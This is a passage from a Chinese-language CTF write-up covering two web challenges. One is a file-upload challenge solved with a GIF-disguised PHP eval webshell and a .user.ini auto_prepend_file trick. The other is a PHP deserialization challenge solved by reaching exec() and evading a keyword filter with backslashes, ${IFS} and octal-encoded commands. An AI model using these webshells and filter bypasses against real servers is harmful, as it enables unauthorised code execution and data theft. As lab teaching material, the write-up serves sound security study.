class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"background.jpg"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background-size:cover"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"uploads/index.php"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"round_icon"</span> <span class="hljs-attr">align</span>=<span class="hljs-string">"middle"</span>  <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"index.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: blue;"</span>&gt;</span>更换头像<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fileUpload"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: blue;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"upload"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"提交"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**==.htaccess文件==**：<code>.htaccess</code> 由于它以点或点开头，因此通常称为“点文件”。 <strong>点文件几乎总是某种形式的配置文件</strong>。 点文件可以用于操作系统或软件。 默认情况下，操作系统会将点文件隐藏在查找程序窗口或任何类型的系统文件管理器中。 通常，您必须从操作系统的首选项中选择“显示隐藏的文件”选项。 或者您可以使用 <code>ls -a</code> 命令以在命令行上显示所有文件。</p><p>​        全称是Hypertext Access(超文本入口)。<strong>提供了针对目录改变配置的方法</strong>， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<strong>管理员可以通过Apache的AllowOverride指令来设置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>​<strong>.htaccess的配置文件只能在Apache服务器中起作用</strong></p></li><li><p><strong>==.user.ini==<strong>：</strong>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</strong></p></li><li><p><code>&lt;?php =eval($_REQUEST["xxx"] )?&gt;</code>:_REQUEST包含了 _GET、 GET、_POST、$_COOKIE的所有内容，是它们的集合体。也就内是说只要用其中一种方容式做一个表单，把cmd这个变量给POST或者GET，甚至用cookies就可以把传输上去的内容执行。简而言之吧，就是执行cmd的值。</p></li><li><p><strong>蚁剑的工作原理：首先你需要发现服务端的一句话木马，每次连接的密码其实就是一句话木马的名字，蚁剑会帮你执行各种代码以获取完整的服务器目录。</strong></p></li><li><p>**==利用.user.ini的条件==**：</p><p>**服务器脚本语言为PHP **</p><p>**服务器使用CGI **</p><p>**FastCGI模式 **</p><p><strong>上传目录下要有可执行的php文件</strong></p></li><li><p>**==图片头文件GIF89a==**：</p><p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年发行），但在<strong>Web上所见到的大多数图形都是以89a版的格式创建的</strong>。 89a版的一个最主要的优势就是<strong>可以创建动态图像</strong>，特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p></li><li><p><strong>关于在Content-Type中multipart/form-data的解析：</strong></p><p><strong>boundary是表示分隔，用于分隔多个文件。格式是：–后面跟着一串随机数</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNolPbAiXBmFZAw6W<br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>//提交为文件<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="fileUpload"; filename=".user.ini"<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br>//这里的content-type是文件类型，浏览器自己判断<br>GIF89a<br>auto_prepend_file=b.jpg<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="upload"<br>æäº¤<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W--<br><br>//提交为表单字段<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="note"<br>字段内容<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p>首先试一下能不能访问<code>index.phps</code>，<code>flag.php</code>，好吧，都没用。题目的意思一个是想让我们上传一张图片。我们先上传其他的类型的文件试试：</p><p>上传.txt文件回显：<code>your filetype looks wicked</code>（你的文件是恶意的），说明大部分的文件格式被过滤</p><p>上传图片文件回显：<code>file upload successful, the path is:  uploads/2051259.jpg</code></p><p>可以知道文件上传后是存放在uploads/文件夹里</p><p><strong>我们需要明确一点，文件上传的解题是需要我们上传可执行文件，从而控制服务端</strong></p><p><strong>所以我们这里使用.user.ini配置文件来让index.php文件包含一个webshell，所以我们先创建一个包含shell语句的图片马b.txt</strong></p><p>内容如下：之后修改文件后缀为.gif，直接上传即可，因为图片文件未被过滤</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br>&lt;?=eval($_REQUEST<span class="hljs-section">['cmd']</span>)<span class="hljs-comment">;?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_6.jpg" class=""><p><strong>之后想办法上传.user.ini文件，但会被过滤，所以我们使用BP抓包，修改上传文件的类型<code>application/octet-stream</code>为<code>image/gif</code>,</strong></p><p>创建一个.user.ini文件，其内容如下：auto_prepend_file是指当前目录下的任意php文件都要包含=之后的文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=b.gif<br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_5.jpg" class=""><p>上传成功，未被过滤</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_7.jpg" class=""><p>下面我们使用蚁剑连接服务器：</p><p>首先查看地址，是要在<code>/uploads</code>目录下</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_4.jpg" class=""><p>连接成功，可能会连接不上，多上传几次</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_2.jpg" class=""><p>在根目录下发现flag</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_3.jpg" class=""><p>答案：cyberpeace{9f37b587e6875ce35380526dba1120c6}</p><h4 id="8-unseping-江苏工匠杯（过滤的绕过）"><a href="#8-unseping-江苏工匠杯（过滤的绕过）" class="headerlink" title="8_unseping 江苏工匠杯（过滤的绕过）"></a>8_unseping 江苏工匠杯（过滤的绕过）</h4><h5 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">"ping"</span>))) {<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        }<br>    } <br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>{<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">"/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/"</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"don't hack"</span>;<br>        }<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        }<br>    }   <br>}<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ctf'</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>PHP序列化和反序列化</strong>：</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php序列化和反序列化方式主要有：serialize，unserialize；json_encode，json_decode。</p></li><li><p>反序列化中常见的魔术函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>() 当一个对象创建时被调用，反序列化不触发<br><span class="hljs-built_in">__destruct</span>()  当一个对象销毁时被调用<br><span class="hljs-built_in">__toString</span>()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接<br><span class="hljs-built_in">__call</span>()      当调用的方法不存在时触发<br><span class="hljs-built_in">__invoke</span>()    当一个对象被当作函数调用时触发<br><span class="hljs-built_in">__wakeup</span>()    反序列化时自动调用<br><span class="hljs-built_in">__sleep</span>()     执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__get</span>()       类中的属性私有或不存在触发<br><span class="hljs-built_in">__set</span>()       类中的属性私有或不存在触发<br></code></pre></td></tr></table></figure></li><li><p>PHP函数：</p><ul><li>call_user_func_array：把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</li><li>exec：用来执行一个外部程序，不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面</li><li>passthru：只调用命令，把命令的运行结果原样地直接输出到标准输出设备上</li><li>system：输出并返回最后一行shell结果</li></ul></li><li><p><strong>==shell语句被过滤的一些绕过技巧：==</strong></p><p><strong>空格被过滤：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt; 、&lt;&gt;、%09(tab键)、%20、$IFS$9、$IFS$1、${IFS}、$IFS等，还可以用{} 比如 {cat,flag}<br></code></pre></td></tr></table></figure><p><strong>敏感字符被过滤：</strong></p><p>字符串转为8进制</p></li><li><p>linux中的**<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="28.397ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 12551.4 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(2444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(3444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">用</text></g><g data-mml-node="mi" transform="translate(4444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">于</text></g><g data-mml-node="mi" transform="translate(5444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">执</text></g><g data-mml-node="mi" transform="translate(6444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">行</text></g><g data-mml-node="mi" transform="translate(7444.4,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(7913.4,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(8489.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(8955.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(9253.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(9551.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">命</text></g><g data-mml-node="mi" transform="translate(10551.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">令</text></g><g data-mml-node="mi" transform="translate(11551.4,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">：</text></g></g></g></svg></mjx-container>(shell)</p></li><li><h5 id="linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”"><a href="#linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”" class="headerlink" title="==linux中的printf函数支持字符串的8进制表示的读入==：使用printf “hello world”"></a>==linux中的<code>printf</code>函数支持字符串的8进制表示的读入==：使用printf “hello world”</h5></li></ul><h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>​        这是一个很明显的反序列化题。首先可以明确的是我们需要传入一个POST变量ctf，其反序列化生成的对象时，会首先调用construct函数构造一个对象，然后调用__wakeup函数，其调用了waf，去检测<code>args</code>里是否有敏感字符<code>cat|flag|tac|php|ls</code>，这里说明args应该是一个数组，先记下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {<br>    <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//检测敏感字符</span><br>}<br></code></pre></td></tr></table></figure><p>然后代码结束，调用__destruct函数，发现这是在查看上传的method是否在数组ping中，如果有，则调用<code>call_user_func_array</code>，将<code>array($this, $this-&gt;method)</code>作为函数，<code>this-&gt;args</code>作为函数参数，很显然，我们应该去调用ping函数，<strong>里面有exec函数，这个函数可以使用系统命令，我们可以查看当前服务器下的一些东西</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>{<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>}<br></code></pre></td></tr></table></figure><p><strong>那么上传变量的产生方式应为：在PHP代码里生成序列化，然后base64-encode。</strong></p><p>比如我们想要查看index.php同级目录下的文件，</p><p>我们可以在PHP中这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'ls'</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//但是我们想起来之前有一段对输入数组的过滤，其中就有ls，那么我们应该写为</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'l\s'</span>));<span class="hljs-comment">//使用反写杠绕过过滤</span><br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</span><br></code></pre></td></tr></table></figure><p><strong>注意用POST参数传入</strong></p><p>那么我得到回显：<code>array(2) { [0]=&gt; string(12) "flag_1s_here" [1]=&gt; string(9) "index.php" }</code></p><p>说明index.php同级目录下还有一个<code>flag_1s_here</code>文件，没有后缀的话，可能时目录，编写shell，继续执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'l\s${IFS}-l${IFS}fl\ag_1s_here'</span>));<span class="hljs-comment">//注意flag和空格也被过滤掉，分别用反斜杠和${IFS}绕过</span><br>    <br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozMDoibFxzJHtJRlN9LWwke0lGU31mbFxhZ18xc19oZXJlIjt9fQ==</span><br></code></pre></td></tr></table></figure><p>回显：<code>array(2) { [0]=&gt; string(7) "total 4" [1]=&gt; string(64) "-rwxr-xr-x 1 root root 53 Nov 9 13:21 flag_831b69012c67b35f.php" }</code></p><p>flag应该就在<code>flag_831b69012c67b35f.php</code>里了</p><p><strong>因为<code>/</code>被过滤掉了，所以将字符串转为8进制，正常的字符串应该这样写</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'$(printf${IFS}"cat /flag_1s_here/flag_831b69012c67b35f.php")'</span>));<br></code></pre></td></tr></table></figure><p>那么转为8进制则为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'</span>));<br><br><span class="hljs-comment">//执行得到</span><br><span 